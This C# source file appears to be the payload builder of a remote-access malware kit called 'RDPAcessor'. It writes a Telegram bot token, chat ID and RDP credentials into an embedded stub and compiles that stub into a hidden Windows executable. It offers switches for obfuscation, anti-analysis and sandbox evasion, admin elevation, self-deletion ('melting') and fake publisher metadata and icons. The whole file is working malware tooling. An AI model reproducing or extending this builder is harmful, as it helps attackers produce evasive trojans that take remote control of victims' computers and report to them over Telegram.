using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace RDPAcessor.Algorithms.Compilator
{
    class Compilator
    {
        public static string Compiler(string OutFilePath, string Token, string Chatid, 
            bool UseObfuscate, bool UseAntiAnalysis, bool UseAntiAnyRun, bool UseMutex,
            string MutexValue, bool UseMelting, bool UseRunAsAdmin, string IconFile, string AssemblyFile,
            string RdpUsername, string RdpPassword)
        {
            string stubCode = Properties.Resources.stub;

            if (Token != null && Chatid != null && RdpUsername != null && RdpPassword != null)
            {
                stubCode = stubCode.Replace("%TOKEN_BOT%", Token);
                stubCode = stubCode.Replace("%CHATID%", Chatid);

                stubCode = stubCode.Replace("%RDP_USER%", RdpUsername);
                stubCode = stubCode.Replace("%RDP_PASS%", RdpPassword);
            }

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = OutFilePath,
                CompilerOptions = "/platform:x86 /target:winexe",
                IncludeDebugInformation = false
            };

            if (!string.IsNullOrEmpty(AssemblyFile) && File.Exists(AssemblyFile))
            {
                parameters.CompilerOptions += " /define:UseAssembly";
                var metadata = File.ReadAllLines(AssemblyFile);

                string title = metadata.Length > 0 ? metadata[0] : "N/A";
                string description = metadata.Length > 1 ? metadata[1] : "N/A";
                string company = metadata.Length > 2 ? metadata[2] : "N/A";
                string product = metadata.Length > 3 ? metadata[3] : "N/A";
                string copyright = metadata.Length > 4 ? metadata[4] : "N/A";
                string trademarks = metadata.Length > 5 ? metadata[5] : "N/A";
                string fileVersion = metadata.Length > 6 ? metadata[6] : "N/A";
                string productVersion = metadata.Length > 7 ? metadata[7] : "N/A";

                stubCode = stubCode.Replace("%TITLE%", title);
                stubCode = stubCode.Replace("%DESC%", description);
                stubCode = stubCode.Replace("%COMPANY%", company);
                stubCode = stubCode.Replace("%PRODUCT%", product);
                stubCode = stubCode.Replace("%COPYRIGHT%", copyright);
                stubCode = stubCode.Replace("%TRADEMARK%", trademarks);
                stubCode = stubCode.Replace("%VERSION%", productVersion);
                stubCode = stubCode.Replace("%FILE_VERSION%", fileVersion);
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.dll");
            parameters.ReferencedAssemblies.Add("System.Reflection.dll");

            if (!string.IsNullOrEmpty(IconFile) && File.Exists(IconFile))
            {
                parameters.CompilerOptions += $" /win32icon:\"{IconFile}\"";
            }

            if (UseAntiAnalysis)
            {
                parameters.CompilerOptions += " /define:AntiAnalysis";
            }

            if (UseAntiAnyRun)
            {
                parameters.CompilerOptions += " /define:AntiAnyRun";
            }
            
            if (UseRunAsAdmin)
            {
                parameters.CompilerOptions += " /define:RunAsAdmin";
            }

            if (UseMelting)
            {
                parameters.CompilerOptions += " /define:Melt";
            }

            if (UseMutex && MutexValue != null)
            {
                parameters.CompilerOptions += " /define:Mutex";

                stubCode = stubCode.Replace("%MUTEX_VALUE%", MutexValue);
            }

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, stubCode);

                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine($"Error compilation: {error.ErrorText}");
                        Console.WriteLine($"File: {error.FileName}");
                        Console.WriteLine($"String: {error.Line}, Column: {error.Column}");
                        Console.WriteLine($"ID Error: {error.ErrorNumber}");
                        Console.WriteLine($"This {(error.IsWarning ? "Warning" : "Error")}");
                        Console.WriteLine(new string('-', 50));
                    }
                    throw new InvalidOperationException("Failed to compilate.");
                }
            }

            if (UseObfuscate)
            {
                Obfuscator.Obfuscator.PerformObfuscation(OutFilePath);
            }

            return $"Compiling successfull!\nCompiled file: {Path.GetFileName(OutFilePath)}";
        }
    }
}
